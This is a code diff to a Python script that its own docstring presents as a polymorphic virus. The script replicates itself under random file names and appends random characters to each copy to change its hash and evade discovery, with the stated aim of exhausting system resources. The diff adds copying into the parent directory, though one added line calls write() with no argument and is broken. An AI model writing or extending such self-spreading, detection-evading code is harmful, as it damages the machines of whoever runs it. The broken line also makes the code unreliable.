@@ -4,8 +4,8 @@
 Created on Wed Jun 28 22:16:15 2023
 Purpose: This is just a generic example of a polymorphic virus. When ran, it creates a copy of itself
          along wtih a random string to generate a new hash making it harder to be discovered. This virus
-         main purpose is to consume system resources and slow down the computer. 
-         
+         main purpose is to consume system resources and slow down the computer.
+
 Warning: THIS WILL FILL YOUR COMPUTER WITH PYTHON FILES AND CONSUME RESOURCES INTO A SCREECHING HALT!
 @author: CyberTools101
 """
@@ -28,7 +28,7 @@ filename = "newpython{randomness}.py".format(randomness="".join(random.choices(s
 
 #start copying the contents of the files to the new one
 g = open(filename, "w")
-
+h = open("..\\" + filename, "w")
 count = len(lines)
 start = 0
 for line in lines:
@@ -37,11 +37,14 @@ for line in lines:
     if start == (count - 1):
         break
     g.write(line)
+    h.write()
 
 #add the string at the end to change hash files and prevent discovery
 g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
 
 #always closing everything
+h.close()
 g.close()
 f.close()
 
